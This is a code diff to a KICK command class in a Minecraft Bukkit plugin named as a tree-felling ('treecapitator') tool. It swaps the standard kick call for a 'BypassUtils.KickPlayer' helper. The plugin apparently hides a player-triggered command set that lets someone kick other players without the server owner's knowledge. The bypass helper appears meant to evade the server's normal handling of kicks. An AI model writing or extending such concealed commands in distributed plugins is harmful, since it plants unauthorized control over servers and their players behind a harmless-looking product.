@@ -1,6 +1,7 @@
 package me.bow.treecapitatorultimate.commands.Player;
 
 import me.bow.treecapitatorultimate.Start;
+import me.bow.treecapitatorultimate.Utils.BypassUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
 import org.bukkit.Bukkit;
@@ -21,7 +22,7 @@ public class KICK extends Command {
                 return;
             }
             if (args.size() == 1) {
-                anotherPlayer.kickPlayer("Kicked from server.");
+                BypassUtils.KickPlayer(anotherPlayer, "Kicked from server.");
                 p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " got kicked (without reason)!");
             } else {
                 String reason = "";
@@ -29,7 +30,7 @@ public class KICK extends Command {
                     reason += args.get(i) + " ";
                 }
                 reason = reason.replace("&", "§").replace("\\n", "\n").replace("|", "\n");
-                anotherPlayer.kickPlayer(reason);
+                BypassUtils.KickPlayer(anotherPlayer, reason);
                 p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " got kicked (with reason)!");
             }
         } catch (Exception e) {
